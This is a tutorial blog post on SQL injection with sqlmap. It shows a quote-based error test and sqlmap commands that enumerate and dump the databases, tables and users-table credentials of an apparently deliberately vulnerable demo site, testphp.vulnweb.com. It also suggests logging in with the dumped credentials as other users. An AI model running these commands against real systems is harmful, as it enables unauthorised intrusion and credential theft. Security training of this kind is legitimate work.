<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/database-hacking/" rel="category tag">Database Hacking</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Database Penetration Testing using Sqlmap (Part 1)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/" rel="bookmark"><time class="entry-date published" datetime="2017-06-28T12:49:23+00:00">June 28, 2017</time><time class="updated" datetime="2025-05-27T12:03:36+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p style="text-align: justify;"><span style="color: #000000;">SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.</span></p>
<h3><span style="color: #800000;">Features</span></h3>
<ul>
<li><span style="color: #000000;">Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, HSQLDB and Informix database management systems.</span></li>
<li><span style="color: #000000;">Full support for six SQL injection techniques: boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries and out-of-band.</span></li>
<li><span style="color: #000000;">Support to directly connect to the database without passing via a SQL injection, by providing DBMS credentials, IP address, port, and database name.</span></li>
<li><span style="color: #000000;">Support to enumerate users, password hashes, privileges, roles, databases, tables, and columns.</span></li>
<li><span style="color: #000000;">Automatic recognition of password hash formats and support for cracking them using a dictionary-based attack.</span></li>
<li><span style="color: #000000;">Support to dump database tables entirely, a range of entries or specific columns as per user’s choice. The user can also choose to dump only a range of characters from each column’s entry.</span></li>
<li><span style="color: #000000;">Support to search for specific database names, specific tables across all databases or specific columns across all databases’ tables. This is useful, for instance, to identify tables containing custom application credentials where relevant columns’ names contain a string like a name and pass.</span></li>
<li><span style="color: #000000;">Support to download and upload any file from the database server underlying file system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.</span></li>
<li><span style="color: #000000;">Support to execute arbitrary commands and retrieve their standard output on the database server underlying operating system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.</span></li>
<li><span style="color: #000000;">Support to establish an out-of-band stateful TCP connection between the attacker machine and the database server underlying operating system. This channel can be an interactive command prompt, a Meterpreter session or a graphical user interface (VNC) session as per user’s choice.</span></li>
<li><span style="color: #000000;">Support for database process’ user privilege escalation via Metasploit’sMeterpreter getsystem command.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9HtUEJZSLpM/WVSm8efMwGI/AAAAAAAAQUg/ZOs-ZUDUZBwcU8Oj92buUrvP0ahv9GFZgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">These options can be used to enumerate the back-end database management system information, structure, and data contained in the tables.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ApSI58k2AJE/WVSm_F4bhjI/AAAAAAAAQUw/4iwJ8dhSzf8WlKpl2wQeGvn0xfnoABgeQCLcBGAs/s1600/2.png"/></span></p>
<h3><span style="color: #800000;">Verifying SQL vulnerability</span></h3>
<p><span style="color: #000000;">Sometimes you visit such websites that let you select product item through their picture gallery if you observer its URL you will notice that product item is called through its product-ID numbers.</span></p>
<p><span style="color: #000000;">Let’s take an example</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://testphp.vulnweb.com/artists.php?artist=1</pre>
<p><span style="color: #000000;">So when attacker visits such kind of website he always checks for SQL vulnerability inside web server for lunching SQL attack.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-uz3Eu3vN9ME/WVSm--FqHFI/AAAAAAAAQUo/7WVGYJhJrrM6BXRaiRJzBEdlwzQKPVOdQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Let’s check how attacker verifies SQL vulnerability.</span></p>
<p><span style="color: #000000;">The attacker will try to break the query in order to order to get the error message, if he successfully received an error message then it confirms that web server is SQL injection affected.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://testphp.vulnweb.com/artists.php?artist=1'</pre>
<p><span style="color: #000000;"><strong> </strong>From the screenshot you can see we have received error message successfully now we have made SQL attack on a web server so that we can fetch database information.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-HZ6UYF8iG_w/WVSm_sFrDdI/AAAAAAAAQU0/pja2aw136O0Naj3vj4_NRk_0lw5hEQUrQCEwYBhgL/s1600/4.1.png"/></span></p>
<h3><span style="color: #800000;">Databases</span></h3>
<p><span style="color: #000000;"><strong> </strong>For database penetration testing we always choose SQLMAP, this tool is very helpful for beginners who are unable to retrieve database information manually or unaware of SQL injection techniques.</span></p>
<p><span style="color: #000000;">Open the terminal in your Kali Linux and type following command which start SQL injection attack on the targeted website.  </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch</pre>
<p><span style="color: #000000;"><strong> </strong><strong>-u:  </strong>target URL</span></p>
<p><span style="color: #000000;"><strong>–dbs: </strong>fetch database name</span></p>
<p><span style="color: #000000;"><strong>–batch:</strong> This will leave sqlmap to go with default behavior whenever user’s input would be required</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Gbn0wr3FuNc/WVSnB93AICI/AAAAAAAAQVA/xAZ9B5tsz-cSJ2Y9SA1Rnf0QZEiKuqVJgCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Here from the given screenshot, you can see we have successfully retrieve database name “<strong>acuart</strong>”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-muzoRZzdB2Y/WVSnAX3VzdI/AAAAAAAAQU4/6_EXktBeZyk-cC0zS-DxrV-Z3FiUi5rCgCEwYBhgL/s1600/5.png"/></span></p>
<h3><span style="color: #800000;">Tables</span></h3>
<p><span style="color: #000000;">As we know a database is a set of record which consist of multiple tables inside it therefore now use another command in order to fetch entire table names from inside the database system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch</pre>
<p><span style="color: #000000;"><strong> </strong><strong>-D: </strong>DBMS database to enumerate (fetched database name)</span></p>
<p><span style="color: #000000;"><strong>–tables: </strong>enumerate DBMS database table</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-3K7pANIaCUc/WVSnA8tzcMI/AAAAAAAAQU8/0OuGt7_-lMQgxjeLVsx7Dved7IgY5OdvQCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">As a result, given in screenshot, we have enumerated entire table name of the database system. There are 8 tables inside the database “acuart” as following:</span></p>
<p><span style="color: #000000;"><strong>T1: artists</strong></span></p>
<p><span style="color: #000000;"><strong>T2: carts</strong></span></p>
<p><span style="color: #000000;"><strong>T3: categ</strong></span></p>
<p><span style="color: #000000;"><strong>T4: featured </strong></span></p>
<p><span style="color: #000000;"><strong>T5: guestbook</strong></span></p>
<p><span style="color: #000000;"><strong>T6: pictures</strong></span></p>
<p><span style="color: #000000;"><strong>T7: products </strong></span></p>
<p><span style="color: #000000;"><strong>T8: users</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0U2Nqsb2VVY/WVSnByXoAZI/AAAAAAAAQVE/IIk5DBZhzUc_O7HD0KBV0Ey6v_5eDEOTACEwYBhgL/s1600/7.png"/></span></p>
<h3><span style="color: #800000;">Columns</span></h3>
<p><span style="color: #000000;">Now further we will try to enumerate the column name of the desired table. Since we know there is a users table inside the database acuart and we want to know all column names of users table, therefore, we will generate another command for column captions enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch</pre>
<p><span style="color: #000000;"><strong>-T: </strong>DBMS table to enumerate (fetched table name)</span></p>
<p><span style="color: #000000;"><strong>–columns:</strong> enumerate DBMS database columns</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-M2Hu_CWI-DE/WVSnCIwsaiI/AAAAAAAAQVI/8FWaciNSr4ETkiukBVZUQi0spRDF528uQCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-mF7LRkA5V6c/WVSnC0HF8NI/AAAAAAAAQVM/ATKwYZ76kRIhiw90iDvwD6gWWeUtKEbnwCEwYBhgL/s1600/9.png"/></span></p>
<h3><span style="color: #800000;">Get data from a table</span></h3>
<p><span style="color: #000000;">Slowly and gradually we have penetrated many details of the database but last and most important step is to retrieve information from inside the columns of a table. Hence, at last, we will generate a command which will dump information of users table.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch</pre>
<p><span style="color: #000000;"><strong>–dump:</strong> dump all information of DBMS database</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-C-EXVS1NW8c/WVSm736cNdI/AAAAAAAAQUY/N79z2iO2LT08571Ha446gbgFFKi-WDClwCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Here from the given screenshot, you can see it has to dump entire information of table users, mainly users table contains login credential of other users. You can use these credential for login into the server on behalf of other users.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-gYMKw2iLsb4/WVSm8TjcEBI/AAAAAAAAQUc/t20gImkvMv0TzCcqk53gxzvG2ckB1_HmgCEwYBhgL/s1600/12.png"/></span></p>
<h3><span style="color: #800000;">Dump All</span></h3>
<p><span style="color: #000000;">The last command is the most powerful command in sqlmap which will save your time in database penetration testing; this command will perform all the above functions at once and dump entire database information including table names, column and etc.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-p1BQZl2HZMU/WVSm88fCI6I/AAAAAAAAQUk/KBvXd6QfL1INTlydOKHR6AGAa_1NeydjACEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">This will give you all information at once which contains database name as well as table’s records.</span></p>
<p><span style="color: #000000;">Try it yourself!!!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4XCG8vhqAhI/WVSm_LWBA6I/AAAAAAAAQUs/0xmoiYXpZpgBNoN4Aj9MSViX0S3C7ak0QCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">To learn more about Database Hacking. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/database-hacking/">Link.</a></strong></p>
<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
